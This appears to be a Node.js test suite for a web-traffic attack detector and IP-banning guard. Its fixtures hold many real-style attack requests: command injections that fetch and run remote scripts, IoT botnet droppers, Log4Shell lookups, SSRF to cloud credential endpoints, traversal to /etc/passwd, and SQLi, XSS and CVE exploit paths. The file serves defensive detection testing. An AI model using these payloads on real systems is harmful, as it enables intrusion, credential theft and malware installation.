// The detection engine (core/payloads.mjs, normalize.mjs, lexers.mjs): what it
// catches, encoded or not, and, just as much, what it must never catch.
import { test } from "node:test";
import assert from "node:assert/strict";
import { inspect, classify, signatureById, catalog, SIGNATURES, UA_SIGNATURES } from "../core/payloads.mjs";
import { CATEGORIES, categoryById, abuseCategories } from "../core/taxonomy.mjs";
import { normalize, decodeDeep, collapse } from "../core/normalize.mjs";
import { sqli, xss } from "../core/lexers.mjs";
import { requiredLiterals, Matcher } from "../core/matcher.mjs";
import { Guard, BAN_AT } from "../sensor/guard.mjs";

globalThis.__corpus = [];
const look = (o) => { globalThis.__corpus.push(o.path); if (o.ua) globalThis.__corpus.push(o.ua); return inspect(o); };
const is = (path, cat, opts = {}) => {
  const r = look({ path, ...opts });
  assert.ok(r.id, `nothing found in ${path}`);
  const cats = r.list.map((h) => h.cat);
  assert.ok(cats.includes(cat), `${path}: expected ${cat}, got ${r.id} (${cats.join(", ")})`);
  return r;
};
const payload = (path, cat, opts) => { const r = is(path, cat, opts); assert.equal(r.score, 3, `${path} should be a payload (${r.pts} points: ${r.hits.join(", ")})`); return r; };
const clean = (path, opts = {}) => { const r = look({ path, ...opts }); assert.equal(r.id, null, `${path} is not an attack, but got ${r.id} (${r.hits?.join(", ")}): ${r.det || ""}`); };

test("taxonomy: every signature has a known category and severity; categories map to AbuseIPDB", () => {
  assert.ok(CATEGORIES.length >= 20);
  for (const s of catalog()) {
    assert.ok(categoryById(s.cat), `${s.id}: category ${s.cat}`);
    assert.ok(["critical", "high", "medium", "low", "info"].includes(s.sev), `${s.id}: severity ${s.sev}`);
    if (s.cve) assert.match(s.cve, /^CVE-\d{4}-\d{4,}$/, s.id);
  }
  for (const c of CATEGORIES) assert.ok(c.abuse.length && c.mitre.length, c.id);
  assert.ok(catalog().filter((s) => s.cve).length >= 40, "known exploits are tagged with their CVE");
  assert.deepEqual(abuseCategories(["sqli"]), [16, 21]);
  assert.deepEqual(abuseCategories(["bruteforce", "iot"]), [15, 18, 21, 23]);
  // the old ids are still known (profiles and logs carry them)
  for (const id of ["env-file", "vcs", "traversal", "php-rce", "log4shell", "xss", "sqli", "cmd-inject", "router", "rce", "edge-exploit", "infra-api", "info-leak", "phish-kit",
                    "java-admin", "wordpress", "db-admin", "vpn-panel", "device", "php-probe", "attack-tool", "scanner-ua"]) assert.ok(signatureById(id), id);
  assert.equal(new Set([...SIGNATURES, ...UA_SIGNATURES].map((s) => s.id)).size, SIGNATURES.length + UA_SIGNATURES.length, "ids are unique");
});

test("normalization: multi-pass, %u, overlong UTF-8, look-alikes, entities, null bytes, dot segments", () => {
  const f = {};
  assert.equal(decodeDeep("%252e%252e%252f", f), "../"); assert.ok(f.double);
  const g = {}; assert.equal(decodeDeep("%c0%ae%c0%ae%c0%af", g), "../"); assert.ok(g.overlong);
  const h = {}; assert.equal(decodeDeep("%e0%80%af", h), "/"); assert.ok(h.overlong);
  const u = {}; assert.equal(decodeDeep("%u002e%u002e%u2215", u), "..∕"); assert.ok(u.unicode);
  assert.equal(normalize("/a/%EF%BC%8E%EF%BC%8E%EF%BC%8Fb").path, "/a/../b");
  assert.equal(normalize("/x?q=%26lt%3Bscript%26gt%3B").params[0][1], "<script>");
  assert.equal(normalize("/x?q=a+b").params[0][1], "a b");
  assert.equal(normalize("/a%00.php").path, "/a.php");
  assert.ok(normalize("/a%00.php").flags.nul);
  assert.equal(normalize("/a\\..\\b").path, "/a/../b");
  assert.equal(collapse("/a/./b/../../c"), "/c");
  assert.equal(collapse("/x/..;/y/;a/z"), "/y/z");
  assert.equal(normalize("/files/%E9t%E9.txt").path, "/files/été.txt", "Latin-1 bytes stay what they are");
  assert.equal(normalize("/files/%E4%B8%AD%E6%96%87.txt").path, "/files/中文.txt");
});

test("lexers: SQL injection and XSS by shape", () => {
  for (const v of ["' OR '1'='1", "1' OR 1=1--", "admin'--", "admin')#", "1 UNION SELECT 1,2,3", "1'/**/UnIoN/**/sElEcT/**/1,2--", "-1 union all select null,null--",
                   "x'; DROP TABLE users--", "1 AND SLEEP(5)", "1' order by 3--", "1 and extractvalue(1,concat(0x7e,version()))", "1;waitfor delay '0:0:5'--", "1) or (1=1", "1'+sleep(5)+'"])
    assert.equal(sqli(v)?.sev, "critical", v);
  for (const v of ["O'Reilly", "rock 'n' roll", "it's 5 o'clock", "select a file from the menu", "trade union select committee", "Tom & Jerry", "5 or more",
                   "C# tutorial", "don't -- really", "price < 5 and > 2", "how to select from table where id = 1", "a || b", "1; 2; 3", "what's #1?"])
    assert.equal(sqli(v), null, v);
  for (const v of ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg/onload=alert(1)>", "javascript:alert(document.cookie)", "java\tscript:alert(1)",
                   "';alert(1)//", "\" onmouseover=\"alert(1)", "<details open ontoggle=alert(1)>", "\"-alert(1)-\""])
    assert.equal(xss(v)?.sev, "critical", v);
  for (const v of ["a < b and c > d", "I <3 you", "(hello)", "https://example.com/page", "it's \"great\"", "on=1", "mailto:a@b.c", "<b>bold</b>", "online=yes", "note: done (ok)"])
    assert.equal(xss(v), null, v);
});

test("catches, by category", () => {
  // secrets
  for (const p of ["/.env", "/api/.env.production", "/.git/HEAD", "/.aws/credentials", "/wp-config.php.bak", "/backup.sql", "/phpinfo.php", "/actuator/env", "/.vscode/sftp.json", "/docker-compose.yml"]) payload(p, "secrets");
  // traversal / LFI
  for (const p of ["/../../etc/passwd", "/download?file=..%2F..%2F..%2Fetc%2Fpasswd", "/x?page=php://filter/convert.base64-encode/resource=index.php", "/x?f=/proc/self/environ"]) payload(p, "traversal");
  // command and code injection
  for (const p of ["/cgi-bin/x?cmd=;wget%20http://198.51.100.9/x.sh", "/?x=$(curl%20http://203.0.113.5/a)", "/index.php?x=%3C%3Fphp%20system($_GET[c]);%20%3F%3E", "/?q=;cat%20/etc/passwd",
                   "/x?ip=127.0.0.1;id", "/?a=a%0aid%0a", "/?c=1;bash%20-c%20%27curl%20http://203.0.113.5/a|sh%27", "/?x=a${IFS}b"]) payload(p, "rce");
  // SQL injection
  for (const p of ["/item?id=1%27%20OR%20%271%27%3D%271", "/item?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", "/item?id=1%27/**/UnIoN/**/SeLeCt/**/1,2--",
                   "/item?id=1%20AND%20SLEEP(5)", "/login?user=admin%27--", "/items/1'%20or%20'1'='1", "/x?id=1;waitfor%20delay%20%270:0:5%27--"]) payload(p, "sqli");
  // XSS
  for (const p of ["/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "/?q=%3Cimg%20src=x%20onerror=alert(1)%3E", "/?next=javascript:alert(document.domain)",
                   "/?q=%22%3E%3Csvg/onload=alert(1)%3E", "/?x=java%09script:alert(1)"]) payload(p, "xss");
  // SSRF, XXE, SSTI, deserialization, Log4Shell
  payload("/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", "ssrf");
  payload("/fetch?u=gopher://127.0.0.1:6379/_FLUSHALL", "ssrf");
  payload("/x?u=http://metadata.google.internal/computeMetadata/v1/", "ssrf");
  payload("/x?xml=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E", "xxe");
  payload("/?name={{''.__class__.__mro__[1].__subclasses__()}}", "ssti");
  payload("/?x=${T(java.lang.Runtime).getRuntime().exec('id')}", "ssti");
  assert.equal(is("/?name={{7*7}}", "ssti").sev, "high", "a probe for template injection: worth points, not a drop on its own");
  payload("/?data=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29y", "deser");
  payload("/?d=O:8:%22stdClass%22:1:{s:4:%22test%22;s:3:%22abc%22;}", "deser");
  payload("/?x=${jndi:ldap://198.51.100.1/a}", "log4shell");
  payload("/?x=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://198.51.100.1/a}", "log4shell");
  payload("/?x=${${lower:j}ndi:${lower:l}dap://x/a}", "log4shell");
  // web shells, phishing kits, IoT botnets, miners, cloud APIs
  for (const p of ["/alfa.php", "/wp-content/plugins/x/wso112233.php", "/.well-known/admin.php", "/ALFA_DATA/alfacgiapi/perl.alfa"]) payload(p, "webshell");
  for (const p of ["/shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.3/jaws;sh+/tmp/jaws", "/GponForm/diag_Form?images/",
                   "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://198.51.100.4:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"]) payload(p, "iot");
  payload("/?x=curl%20-s%20http://198.51.100.5/xmrig%20-o%20stratum+tcp://pool.example:3333", "miner");
  payload("/containers/json", "infra");
  payload("/js/twint_ch.js", "phishing");
});

test("known exploits carry their CVE", () => {
  const cve = (p, id, opts) => { const r = inspect({ path: p, ...opts }); assert.ok(r.cves?.includes(id), `${p}: expected ${id}, got ${r.cves?.join(", ")} (${r.hits?.join(", ")})`); assert.equal(r.score, 3); };
  cve("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "CVE-2017-9841");
  cve("/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", "CVE-2022-22965");
  cve("/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", "CVE-2018-13379");
  cve("/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", "CVE-2021-41773");
  cve("/_ignition/execute-solution", "CVE-2021-3129");
  cve("/autodiscover/autodiscover.json?@zdi/Powershell", "CVE-2021-34473");
  cve("/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", "CVE-2024-4577");
  cve("/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "CVE-2024-4577");       // the soft hyphen, folded
  cve("/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "CVE-2020-5902");
  cve("/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http://198.51.100.2/a.sh%60)", "CVE-2023-1389");
  cve("/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1", "CVE-2018-20062");
  cve("/", "CVE-2014-6271", { ua: "() { :; }; /bin/bash -c 'id'" });
});

test("encoded evasion is seen through", () => {
  for (const p of ["/static/%2e%2e/%2e%2e/etc/passwd", "/static/%252e%252e%252f%252e%252e%252fetc%252fpasswd", "/static/..%c0%af..%c0%afetc%c0%afpasswd", "/static/..%u2215..%u2215etc%u2215passwd",
                   "/files/..%5c..%5cwindows%5cwin.ini", "/static/%EF%BC%8E%EF%BC%8E%EF%BC%8F%EF%BC%8E%EF%BC%8E%EF%BC%8Fetc/passwd", "/a/..;/..;/etc/passwd"]) payload(p, "traversal");
  payload("/item?id=1%2527%2520OR%25201%253D1--", "sqli");
  payload("/x?id=1%u0027%20or%201=1--", "sqli");
  payload("/?q=%26lt;script%26gt;alert(1)%26lt;/script%26gt;", "xss");
  payload("/?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E", "xss");
  payload("/.%65nv", "secrets");
  payload("/%2Egit/config", "secrets");
  payload("/.git%2fconfig", "secrets");
  // weak alone, a payload together: an <iframe> is suspicious; hidden behind double encoding it's an attack
  assert.equal(inspect({ path: "/x?a=%3Ciframe%20src=//x%3E" }).score, 1);
  const r = inspect({ path: "/x?a=%253Ciframe%2520src=//x%253E" });
  assert.equal(r.score, 3); assert.ok(r.hits.includes("evasion"));
  assert.ok(inspect({ path: "/a%c0%afb" }).hits.includes("overlong-utf8"), "overlong UTF-8 is never innocent");
});

test("protocol abuse: methods, proxy probes, CRLF, sizes", () => {
  assert.equal(inspect({ path: "/", method: "TRACE" }).id, "trace-method");
  assert.equal(inspect({ path: "/", method: "CONNECT" }).id, "proxy-probe");
  assert.equal(inspect({ path: "/", method: "JEXBOSS" }).id, "bad-method");
  assert.equal(inspect({ path: "http://198.51.100.7/" }).id, "proxy-probe");
  for (const m of ["PROPFIND", "MKCOL", "MOVE", "COPY", "LOCK", "REPORT", "OPTIONS", "PATCH", "DELETE", "PUT"]) assert.equal(inspect({ path: "/remote.php/dav/files/a/", method: m }).id, null, `${m} is WebDAV or plain HTTP`);
  assert.equal(inspect({ path: "*", method: "OPTIONS" }).id, null);
  const c = inspect({ path: "/x?a=b%0d%0aSet-Cookie:%20x=1" });
  assert.equal(c.id, "crlf-injection"); assert.equal(c.score, 3);
  assert.equal(inspect({ path: "/x?q=line1%0D%0Aline2" }).id, null, "a textarea sent by GET has newlines");
  assert.equal(inspect({ path: "/x?q=" + "a".repeat(5000) }).id, "oversized-url");
  assert.equal(inspect({ path: "/x?" + Array.from({ length: 300 }, (_, i) => `p${i}=1`).join("&") }).id, "param-flood");
});

test("the User-Agent and Referer: attack tools are payloads, scanners and bots only labels", () => {
  assert.equal(inspect({ path: "/", ua: "sqlmap/1.8#stable (https://sqlmap.org)" }).score, 3);
  for (const ua of ["python-requests/2.31.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.0.0 Safari/537.36", "zgrab/0.x", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"]) {
    const r = inspect({ path: "/", ua });
    assert.equal(r.cat, "bot", ua); assert.ok(r.label, `${ua}: a label`); assert.equal(r.pts, 0);
  }
  assert.equal(inspect({ path: "/", ua: "${jndi:ldap://198.51.100.1/a}" }).id, "log4shell");
  assert.equal(inspect({ path: "/", referer: "https://x.example/${jndi:ldap://198.51.100.1/a}" }).id, "log4shell");
  assert.equal(inspect({ path: "/", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36" }).id, null);
  assert.equal(inspect({ path: "/", ua: "" }).id, null, "no User-Agent alone is nothing");
  assert.ok(inspect({ path: "/.env", ua: "" }).hits.includes("no-ua"), "with an attack it's noted");
  assert.equal(inspect({ path: "/", referer: "https://www.google.com/search?q=it%27s+(here)" }).id, null);
});

test("never an attack: the traffic of real apps", () => {
  const jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
  for (const p of [
    "/", "/index.html", "/assets/index-4f3a9c1b.js", "/assets/index-DxkR2_3a.css", "/favicon.ico", "/manifest.webmanifest", "/sw.js", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
    "/.well-known/acme-challenge/k8s7dhD8sJ2nQ", "/.well-known/openid-configuration", "/_next/static/chunks/pages/_app-abc123.js", "/_next/image?url=%2Fimages%2Fhero.png&w=1920&q=75",
    "/_next/image?url=https%3A%2F%2Fcdn.example.com%2Fa.png&w=640&q=75", "/scripts/app.js", "/portal/home", "/console", "/sdk/js/v2.js",
    // APIs, searches, filters
    "/api/v1/users/42", "/api/v1/search?q=O%27Reilly%20books&page=2", "/search?q=rock+%27n%27+roll", "/search?q=select+a+file+from+the+menu", "/search?q=Tom+%26+Jerry",
    "/search?q=how+to+select+from+table+where+id+%3D+1", "/search?query=cats", "/search?q=it%27s+5+o%27clock", "/api/items?filter=price%3E%3D10%20and%20price%3C%3D20",
    "/api/v1/query?query=sum(rate(http_requests_total%7Bjob%3D%22api%22%7D%5B5m%5D))%20by%20(code)", "/graphql?query=%7B%20user(id%3A%20%221%22)%20%7B%20name%20email%20%7D%20%7D",
    "/app/discover?_g=(filters:!(),time:(from:now-15m,to:now))&_a=(query:(language:kuery,query:'status:500'))", "/d/abc123/dashboard?orgId=1&from=now-6h&to=now&var-host=All",
    "/?utm_source=newsletter&utm_campaign=spring%20sale%20%E2%80%94%2050%25%20off", "/wiki/Rock_'n'_Roll", "/wiki/O'Reilly_Media", "/blog/2024/10/why-we-use-sql-select-statements",
    // sign-ins, OAuth, signed and encrypted links, tokens
    "/oauth/callback?code=4%2F0AX4XfWhExampleCode&state=eyJyZXR1cm5UbyI6Ii9kYXNoYm9hcmQifQ%3D%3D&scope=email%20profile%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email",
    "/__gate/sso?next=%2Fpath%3Fa%3D1%26b%3Dhttps%253A%252F%252Fexample.com%252F", "/auth/authorize?response_type=code&redirect_uri=https%3A%2F%2Fexample.com%2F%3Fauth_callback%3D1&client_id=https%3A%2F%2Fexample.com%2F",
    `/reset/${jwt}`, `/api/stream?token=${jwt}`, "/download/860562e15a39/XM2gw0AXCte9GoCAn3JmOGnLq8fHmUSvSetEfVGnceXtDEognlAbC?sig=Zm9vYmFyYmF6cXV4c2VsZWN0dW5pb24rLz0%3D&exp=1700000000",
    "/f/a.bin?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAEXAMPLE%2F20240101%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240101T000000Z&X-Amz-Signature=0f1e2d3c4b5a69788796a5b4c3d2e1f0",
    // Termix, Selkies, websockets, media, Home Assistant, Nextcloud
    "/ssh/websocket/?token=" + jwt, "/users/db/host/internal", "/socket.io/?EIO=4&transport=websocket&sid=abc123", "/websockets?token=abcdef0123456789", "/webrtc/signalling/",
    "/api/websocket", "/Videos/abc/stream.mp4?Static=true&mediaSourceId=abc&api_key=0123456789abcdef", "/remote.php/dav/files/alice/Photos/2024-01-01%2012.00.00.jpg",
    "/index.php/s/Xk3pQ9wErTyUiOp/download?path=%2F&files=report.pdf",
    // file managers with odd names
    "/api/resources/home/user/My%20Docs/report%20(final)%20v2.pdf", "/files/R%C3%A9sum%C3%A9%20(2024)%20%5Bdraft%5D.docx", "/files/%E4%B8%AD%E6%96%87%E6%96%87%E4%BB%B6.txt",
    "/files/%E9t%E9.txt", "/files/100%25%20done.txt", "/files/a+b=c%3B%20d's%20notes.md", "/files/O'Brien%20-%20select%20from%20archive.pdf", "/files/C%23%20notes%20--%20draft.md",
    "/api/raw/photos/2024/IMG_0001.JPG?auth=" + jwt, "/files/backup-2024-10-01.tar.gz", "/files/notes%20(1).txt", "/files/what%3F%20why%21.txt", "/files/~tmp%24%20file.docx",
    "/files/%3Cdraft%3E%20plan.txt", "/files/a%26b%20%26%20c.pdf", "/files/50%25%20off%20%5B1%5D.png",
  ]) clean(p);
  for (const p of ["/remote.php/dav/files/alice/", "/remote.php/dav/files/alice/Doc.txt"]) clean(p, { method: "PROPFIND" });
  clean("/", { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1" });
  clean("/", { ua: "curl/8.5.0" });
});

test("fuzz: 20 000 random tokens, links and filenames are never attacks", () => {
  let seed = 42;
  const rnd = () => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff; };
  const pick = (s, n) => Array.from({ length: n }, () => s[Math.floor(rnd() * s.length)]).join("");
  const url = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_", b64 = url.slice(0, 62) + "+/";
  const bad = [];
  for (let i = 0; i < 20000; i++) {
    const tok = pick(url, 16 + Math.floor(rnd() * 100));
    const kind = i % 5;
    const p = kind === 0 ? `/${tok}` : kind === 1 ? `/s/${pick(url, 8)}/${tok}?t=${pick(url, 24)}` : kind === 2 ? `/api/x?token=${encodeURIComponent(pick(b64, 40 + Math.floor(rnd() * 80)) + "==")}`
      : kind === 3 ? `/r/${pick(url, 20)}.${pick(url, 40)}.${pick(url, 43)}` : `/files/${pick(url + " .()", 12)}.${["pdf", "jpg", "txt", "docx", "mp4"][i % 5]}`;
    const r = inspect({ path: p });
    if (r.id && !r.probe) bad.push(`${p} -> ${r.id}`);
  }
  assert.deepEqual(bad.slice(0, 5), [], `${bad.length} false positives`);
});

test("the literal prefilter never hides a match (every regex's literal is really required)", () => {
  assert.deepEqual(requiredLiterals(/(^|\/)\.env(\.[\w.-]*)?$/i), [".env"]);
  assert.deepEqual(requiredLiterals(/\/(sdk|onvif)\/x/i), ["sdk", "onvif"]);
  assert.deepEqual(requiredLiterals(/(a|b?)c+d/), ["c"]);
  assert.equal(requiredLiterals(/[a-z]+\d/), null);
  // every pattern, on a corpus of attacks and ordinary traffic: when it matches, its literal is there
  const corpus = [...new Set([...(globalThis.__corpus || []), "/.env", "/x/.ENV.local", "/%2e%2e/etc/passwd", "/a?b=${jndi:ldap://x}", "/cgi-bin/luci/;stok=/locale?form=country", "/?-d allow_url_include=1",
    "/wp-login.php", "/PHPMYADMIN/", "/x?cmd=;WGET http://198.51.100.1/x", "/x?a=rO0ABXNyABdqYXZhLnV0aWwu", "/HNAP1/", "/containers/json", "/.git/HEAD", "/Alfa.PHP", "/x?q=a${IFS}b",
    "/x?q=1|bash", "/x?q=`id`", "/x?q=$(id)", "/x?u=file:///etc/passwd", "/?x=<?php system(1) ?>", "/a/..;/b", "/x\\..\\y", "/api/v1/items/1?page=2", "/assets/app.js"])];
  const all = [...SIGNATURES, ...UA_SIGNATURES].flatMap((s) => s.res);
  const m = new Matcher(all);
  for (const str of corpus) {
    const cand = m.candidates(str);
    all.forEach((re, k) => { if (re.test(str)) assert.ok(cand.has(k), `${re} matches ${str} but its literal ${JSON.stringify(requiredLiterals(re))} wasn't seen`); });
  }
});

// ------------------------------------------------------------------ behaviour, in the guard
function clock() { let t = Date.parse("2026-10-22T12:00:05Z"); return { now: () => t, add: (ms) => { t += ms; } }; }
const req = (g, ip, path, extra = {}, status = 200) => {
  const info = { path, method: "GET", host: "x.example", ...extra };
  const r = g.gate(ip, info);
  g.after(ip, info, { status: r ? r.status : status });
  return { r, info };
};

test("probes count only when the app says the thing isn't here", () => {
  const c = clock(), g = new Guard({ now: c.now });
  for (let i = 0; i < 12; i++) assert.equal(req(g, "198.51.100.30", "/admin.php", {}, 200).r, null, "the app serves it: it's here, and so is the visitor");
  assert.equal(g.bans.has("198.51.100.30"), false);
  let last;
  for (let i = 0; i < 6; i++) last = req(g, "198.51.100.31", `/x${i}.php`, {}, 404).r;
  assert.equal(last?.status, 403, "five not-founds of a probe add up to a ban");
  assert.match(g.bans.get("198.51.100.31").reason, /scored 10/);
});

test("behaviour: wordlist scanning, credential stuffing, floods; known services and you are exempt", () => {
  const c = clock(), g = new Guard({ now: c.now });
  // a dirbuster with a browser's User-Agent: many distinct paths, all not found
  const words = ["admin", "backup", "old", "test", "dev", "api2", "staging", "private", "secret", "tmp", "temp", "logs", "uploads", "data", "db", "files", "include", "lib", "src", "conf", "bin", "cache", "server", "web", "site", "shop", "blog2"];
  let found = null;
  for (const w of words) { const { info } = req(g, "198.51.100.40", `/${w}`, {}, 404); if (info._bw.sig === "content-discovery") found = info._bw; }
  assert.ok(found, "wordlist scanning recognized");
  assert.equal(found.cat, "recon");
  assert.equal(g.bans.has("198.51.100.40"), false, "on its own, worth points, not a ban");
  for (let i = 0; i < 3; i++) req(g, "198.51.100.40", `/wp${i}.php`, {}, 404);
  assert.equal(req(g, "198.51.100.40", "/x").r?.status, 403, "with a few probes on top: banned");
  // credential stuffing
  let r;
  for (let i = 0; i < 25; i++) r = req(g, "198.51.100.41", "/api/login", { method: "POST" }, 401).r;
  assert.equal(r?.status, 403);
  assert.match(g.bans.get("198.51.100.41").reason, /credential stuffing: 25 sign-in attempts/);
  // ten failed sign-ins: a signal, not yet a ban
  for (let i = 0; i < 11; i++) r = req(g, "198.51.100.42", "/login", { method: "POST" }, 401);
  assert.equal(g.bans.has("198.51.100.42"), false);
  assert.ok(g.scores.get("198.51.100.42").score >= 4);
  // a flood: labelled, not banned by itself
  let fl = null;
  for (let i = 0; i < 1210; i++) { const x = req(g, "198.51.100.43", "/assets/app.js"); if (x.info._bw.sig === "flood") fl = x.info._bw; }
  assert.equal(fl?.cat, "dos"); assert.equal(g.bans.has("198.51.100.43"), false);
  // a new minute: a new window
  c.add(60e3);
  assert.equal(req(g, "198.51.100.43", "/assets/app.js").info._bw.sig, undefined);
  // a known crawler doing the same: never banned for it
  g.apply({ t: "verdict", ip: "66.249.66.10", v: { benign: true, bad: false, level: "notice", why: ["Googlebot"] } });
  for (let k = 0; k < 3; k++) { for (const w of words) req(g, "66.249.66.10", `/${w}${k}`, {}, 404); for (let i = 0; i < 4; i++) req(g, "66.249.66.10", `/p${k}${i}.php`, {}, 404); c.add(60e3); }
  assert.equal(g.bans.has("66.249.66.10"), false);
  // you, signed in: hammering your own login or 404ing never bans, and isn't labelled
  for (let i = 0; i < 40; i++) r = req(g, "198.51.100.44", "/api/login", { method: "POST", trusted: () => true }, 401);
  assert.equal(r.r, null); assert.equal(g.bans.has("198.51.100.44"), false);
  const own = req(g, "198.51.100.44", "/ssh/file_manager/readFile?path=%2Fhome%2Fme%2F.ssh%2Fconfig", { trusted: () => true });
  assert.equal(own.r, null);
  assert.equal(g.entry("198.51.100.44", own.info, { status: 200 }).sig, undefined, "your own requests carry no attack labels");
  assert.ok(g.behav.size <= 20000 && g.scores.size <= 20000);
});

test("the log line carries the category, severity, CVE and every hit", () => {
  const g = new Guard();
  const info = { path: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", method: "POST", ua: "" };
  assert.equal(g.gate("198.51.100.50", info).status, 404);
  const e = g.entry("198.51.100.50", info, { status: 404 });
  assert.equal(e.sig, "phpunit-rce"); assert.equal(e.cat, "cve"); assert.equal(e.sev, "critical"); assert.equal(e.cve, "CVE-2017-9841"); assert.equal(e.sc, 3);
  assert.ok(e.pts >= 5); assert.ok(e.hits.includes("no-ua"));
  assert.ok(BAN_AT === 10);
});

test("fast even when every URL is new (no cache to help): well under 100 µs a request", () => {
  const g = new Guard();
  const kinds = [(i) => `/api/v1/items/${i}?page=${i % 7}&sort=name`, (i) => `/search?q=hello+world+${i}&lang=en`, (i) => `/x${i}?id=1%27%20OR%20%271%27%3D%271`,
    (i) => `/static/${i}/..%2f..%2fetc/passwd`, (i) => `/assets/chunk-${i.toString(36)}.js`, (i) => `/files/My%20Doc%20${i}%20(final).pdf`];
  const t0 = performance.now();
  for (let i = 0; i < 12000; i++) g.gate(`198.18.${(i >> 8) & 255}.${i & 255}`, { path: kinds[i % kinds.length](i), method: "GET", ua: `Mozilla/5.0 (X11; Linux x86_64) Chrome/${i % 50}.0 Safari/537.36` });
  const us = ((performance.now() - t0) * 1000) / 12000;
  assert.ok(us < 100, `${us.toFixed(1)} µs a request`);
});
